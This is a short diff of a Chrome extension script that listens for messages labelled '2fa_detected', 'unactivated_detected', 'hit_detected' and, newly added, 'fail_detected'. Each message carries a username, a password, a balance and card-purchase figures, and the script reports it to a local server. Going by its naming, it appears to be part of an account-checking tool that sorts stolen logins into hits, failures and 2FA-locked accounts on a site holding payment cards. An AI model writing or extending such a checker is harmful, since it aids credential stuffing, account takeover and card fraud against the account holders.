@@ -1,5 +1,5 @@
 chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
-    if (message.type === '2fa_detected' || message.type === 'unactivated_detected' || message.type === 'hit_detected') {
+    if (message.type === '2fa_detected' || message.type === 'unactivated_detected' || message.type === 'hit_detected' || message.type === 'fail_detected') {
         const { username, password } = message;
         let endpoint;
         let body = { username, password };
@@ -14,10 +14,11 @@ chrome.runtime.onMessage.addListener((message, sender, sendResponse) => {
                 username,
                 password,
                 balance: message.balance,
-                totalCCS: message.totalCCS,
-                amounts: message.amounts,
-                refunds: message.refunds
+                totalSpent: message.totalSpent,
+                cardsPurchased: message.cardsPurchased
             };
+        } else if (message.type === 'fail_detected') {
+            endpoint = 'report-fail';
         }
 
         // Report to local server
